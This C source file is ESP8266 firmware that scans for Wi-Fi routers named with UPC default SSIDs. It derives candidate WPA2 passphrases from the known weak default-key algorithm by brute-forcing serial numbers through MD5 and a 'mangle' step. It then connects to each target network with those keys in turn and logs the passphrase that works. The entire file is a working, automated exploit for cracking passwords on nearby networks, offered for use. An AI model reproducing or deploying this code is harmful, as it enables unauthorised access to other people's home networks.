#include "ets_sys.h"
#include "osapi.h"
#include "gpio.h"
#include "os_type.h"
#include "user_config.h"
#include "driver/uart.h"
#include "user_interface.h"

typedef struct {
  uint32_t target;
  unsigned char essid[32];
  uint8_t bssid[6];
  uint8_t password[9];
} ap_t;

// counter for APs seen
size_t aps_found;
ap_t aps[MAX_APS];

enum {
    SCANNING,
    TARGETING,
    CRACKING,
    CONNECTING,
    DISCONNECTING,
} state;

size_t ap_timeouts;
static void crack(os_event_t *events);
static void targets_found(void* arg, STATUS status);

#define user_procTaskQueueLen 1
os_event_t user_procTaskQueue[user_procTaskQueueLen];

ICACHE_FLASH_ATTR
static void
scan(os_event_t *events)
{
    if(state == SCANNING){
        state = TARGETING;
        wifi_station_scan(NULL, targets_found);
    } else {
        os_printf("Error: not in scanning state\n");
    }
}

// callback for scan
ICACHE_FLASH_ATTR
static void
targets_found(void* arg, STATUS status){
    struct bss_info *bss_link = (struct bss_info *)arg;
    while (bss_link != NULL){
        bool found = false;
        size_t i;
        for(i = 0; i < aps_found; i++){
            if(aps[i].target && !aps[i].password[0]){
                state = CRACKING;
                system_os_post(PRIO_CRACK, 0, (os_param_t) i);
                // break here to avoid starting another cracking task
                return;
            }
            if(strncmp(aps[i].essid, bss_link->ssid, 32) == 0){
                found = true;
                os_printf("Saw known AP: %02x:%02x:%02x:%02x:%02x:%02x %s", bss_link->bssid[0], bss_link->bssid[1], bss_link->bssid[2], bss_link->bssid[3], bss_link->bssid[4], bss_link->bssid[5], bss_link->ssid);
                if(aps[i].password[0]){
                    os_printf(" (password: %s )", aps[i].password);
                }
                os_printf("\n");
            }
        }
        if(!found && aps_found < MAX_APS){
            os_printf("Found new AP: %02x:%02x:%02x:%02x:%02x:%02x %s\n", bss_link->bssid[0], bss_link->bssid[1], bss_link->bssid[2], bss_link->bssid[3], bss_link->bssid[4], bss_link->bssid[5], bss_link->ssid);
            memcpy(aps[aps_found].bssid, bss_link->bssid, 6);
            memcpy(aps[aps_found].essid, bss_link->ssid, 32);
            aps[aps_found].target = 0;
            if(strncmp(aps[aps_found].essid, "UPC", 3) == 0 && strlen(aps[aps_found].essid) == 10){
                for(i = 3; i < 10; i++){
                    aps[aps_found].target *= 10;
                    aps[aps_found].target += aps[aps_found].essid[i]-0x30;
                }
            }
            aps_found++;
        }

        bss_link = bss_link->next.stqe_next;
    }
    state = SCANNING;
    system_os_post(PRIO_SCAN, 0, 0 );
}

char candidate_passwords[9][MAX_CANDIDATE_PASSWORDS];
size_t current_password;
ICACHE_FLASH_ATTR
static void test_passwords(os_event_t *events){
    size_t ap_to_crack = (size_t) events->par;

    if(state != CONNECTING && state != DISCONNECTING){
        os_printf("Error: not in connecting state\n");
        return;
    }

    if(ap_timeouts == MAX_TIMEOUTS_SECONDS*10){
        os_printf("AP not seen for %u seconds, aborting\n", MAX_TIMEOUTS_SECONDS);
        state = DISCONNECTING;
    }

    if(!candidate_passwords[current_password][0]){
        os_printf("Finished testing passwords\n");
        // done with testing, go back to scanning
        state = DISCONNECTING;
        memcpy(aps[ap_to_crack].password, "<UNKNOWN>", 9);
    }

    if(state == DISCONNECTING){
        wifi_station_disconnect();
        state = SCANNING;
        ap_timeouts = 0;
        system_os_post(PRIO_SCAN, 0, 0 );
        return;
    }

    switch(wifi_station_get_connect_status()){
        case STATION_CONNECTING:
        default:
            break;
        case STATION_WRONG_PASSWORD:
            os_printf("Wrong password!\n");
            current_password++;
            // fall through
        case STATION_IDLE: {
            wifi_station_disconnect();
            ap_timeouts = 0;
            struct station_config config = {{0}};
            memcpy(config.ssid, aps[ap_to_crack].essid, 10);
            memcpy(config.password, candidate_passwords[current_password], 8);
            memcpy(config.bssid, aps[ap_to_crack].bssid, 6);
            config.bssid_set = 0;
            os_printf("Connecting to %s with password %s\n", config.ssid, config.password);
            wifi_station_set_config(&config);
            wifi_station_connect();
            break;
          }
        case STATION_NO_AP_FOUND:
            ap_timeouts++;
            // 100 ms
            os_delay_us(100000);
            break;
        case STATION_CONNECT_FAIL:
            wifi_station_disconnect();
            os_printf("Error connecting... retrying now\n");
            ap_timeouts++;
            // 100 ms
            os_delay_us(100000);
            wifi_station_connect();
            break;
        case STATION_GOT_IP: {
            memcpy(aps[ap_to_crack].password, candidate_passwords[current_password], 8);
            os_printf("Found valid password for %s: %s\n", aps[ap_to_crack].essid, aps[ap_to_crack].password);
            // no need to test more
            state = DISCONNECTING;
            break;
         }
    }
    system_os_post(PRIO_TEST, 0, (os_param_t) ap_to_crack );
}

ICACHE_FLASH_ATTR
void user_init()
{
    uart_init(115200, 115200);
    os_delay_us(100);

    wifi_set_opmode( 0x1 );
    wifi_station_set_auto_connect(false);
    wifi_station_dhcpc_stop();
    wifi_station_set_hostname("esp8266_upc_keys");

    struct ip_info info;
    info.ip.addr = ipaddr_addr("192.168.13.37");
    info.netmask.addr = ipaddr_addr("255.255.255.0");
    info.gw.addr = ipaddr_addr("192.168.1.1");
    wifi_set_ip_info(STATION_IF, &info);

    system_update_cpu_freq(SYS_CPU_160MHZ);

    // set up tasks
    system_os_task(scan, PRIO_SCAN, user_procTaskQueue, user_procTaskQueueLen);
    system_os_task(crack, PRIO_CRACK, user_procTaskQueue, user_procTaskQueueLen);
    system_os_task(test_passwords, PRIO_TEST, user_procTaskQueue, user_procTaskQueueLen);

    // start scanning
    memset(aps, 0x0, sizeof(aps));
    aps_found = 0;
    state = SCANNING;
    system_os_post(PRIO_SCAN, 0, 0 );

}

typedef struct md5_ctx
{
  uint32_t A;
  uint32_t B;
  uint32_t C;
  uint32_t D;

  uint32_t total[2];
  uint32_t buflen;
  uint32_t buffer[32];
} MD5_CTX;
int (*MD5_Init)(MD5_CTX *c) = 0x40009818;
int (*MD5_Update)(MD5_CTX *c, const void *data, unsigned long len) = 0x40009834;
int (*MD5_Final)(unsigned char *md, MD5_CTX *c) = 0x40009900;


/*
 * ----------------------------------------------------------------------------
 * "THE BLASTY-WAREZ LICENSE" (Revision 1):
 * <peter@haxx.in> wrote this file. As long as you retain this notice and don't
 * sell my work you can do whatever you want with this stuff. If we meet some 
 * day, and you think this stuff is worth it, you can intoxicate me in return.
 * ----------------------------------------------------------------------------
 */

#define MAGIC_24GHZ 0xff8d8f20
#define MAGIC_5GHZ 0xffd9da60
#define MAGIC0 0xb21642c9ll
#define MAGIC1 0x68de3afll
#define MAGIC2 0x6b5fca6bll

#define MAX0 9
#define MAX1 99
#define MAX2 9
#define MAX3 9999

ICACHE_FLASH_ATTR
void hash2pass(uint8_t *in_hash, char *out_pass)
{
	uint32_t i, a;

	for (i = 0; i < 8; i++) {
		a = in_hash[i] & 0x1f;
		a -= ((a * MAGIC0) >> 36) * 23;

		a = (a & 0xff) + 0x41;

		if (a >= 'I') a++;
		if (a >= 'L') a++;
		if (a >= 'O') a++;

		out_pass[i] = a;
	}
	out_pass[8] = 0;
}


ICACHE_FLASH_ATTR
uint32_t mangle(uint32_t *pp)
{
	uint32_t a, b;

	a = ((pp[3] * MAGIC1) >> 40) - (pp[3] >> 31);
	b = (pp[3] - a * 9999 + 1) * 11ll;

	return b * (pp[1] * 100 + pp[2] * 10 + pp[0]);
}

ICACHE_FLASH_ATTR
uint32_t upc_generate_ssid(uint32_t* data, uint32_t magic)
{
	uint32_t a, b;

	a = data[1] * 10 + data[2];
	b = data[0] * 2500000 + a * 6800 + data[3] + magic;

	return b - (((b * MAGIC2) >> 54) - (b >> 31)) * 10000000;
}

ICACHE_FLASH_ATTR
static void crack(os_event_t *events){
    size_t ap_to_crack = (size_t) events->par;

    uint32_t buf[4];
    char serial[64];
    char pass[9], tmpstr[17];
    uint8_t h1[16], h2[16];
    uint32_t hv[4], w1, w2, i, cnt = 0;
    MD5_CTX ctx;

    if(state != CRACKING){
        os_printf("Error: not in cracking state\n");
        return;
    }
    if(aps[ap_to_crack].password[0]){
        os_printf("Error: Already cracked this AP (%s)\n", aps[ap_to_crack].essid);
        return;
    }

    if(aps[ap_to_crack].target){
        memset(candidate_passwords, 0x0, sizeof(candidate_passwords));

        // breaks the rules by doing a lot of work all at once
        for (buf[0] = 0; buf[0] <= MAX0; buf[0]++) {
            os_printf("Cracking ESSID UPC%07d... %u/%u\n", aps[ap_to_crack].target, buf[0], MAX0);
        for (buf[1] = 0; buf[1] <= MAX1; buf[1]++)
        for (buf[2] = 0; buf[2] <= MAX2; buf[2]++)
        for (buf[3] = 0; buf[3] <= MAX3; buf[3]++) {
            // feed the watchdog so it doesn't reset us
            system_soft_wdt_feed();

            if (upc_generate_ssid(buf, MAGIC_24GHZ) != aps[ap_to_crack].target)
                continue;

            os_sprintf(serial, "SAAP%d%02d%d%04d", buf[0], buf[1], buf[2], buf[3]);

            MD5_Init(&ctx);
            MD5_Update(&ctx, serial, strlen(serial));
            MD5_Final(h1, &ctx);

            for (i = 0; i < 4; i++) {
                hv[i] = *(uint16_t *)(h1 + i*2);
            }

            w1 = mangle(hv);

            for (i = 0; i < 4; i++) {
                hv[i] = *(uint16_t *)(h1 + 8 + i*2);
            }

            w2 = mangle(hv);

            os_sprintf(tmpstr, "%08X%08X", w1, w2);

            MD5_Init(&ctx);
            MD5_Update(&ctx, tmpstr, strlen(tmpstr));
            MD5_Final(h2, &ctx);

            hash2pass(h2, pass);
            os_printf("  -> WPA2 phrase for '%s' = '%s'\n", serial, pass);
            memcpy(candidate_passwords[cnt], pass, 8);

            cnt++;
            if(cnt == MAX_CANDIDATE_PASSWORDS){
                break;
            }
        }
        }

        // switch to testing the passwords
        os_printf("Testing generated passwords\n");
        current_password = 0;
        state = CONNECTING;
        system_os_post(PRIO_TEST, 0, (os_param_t) ap_to_crack);
    } else {
        os_printf("Not a target\n");
        state = SCANNING;
        system_os_post(PRIO_SCAN, 0, 0 );
    }
}
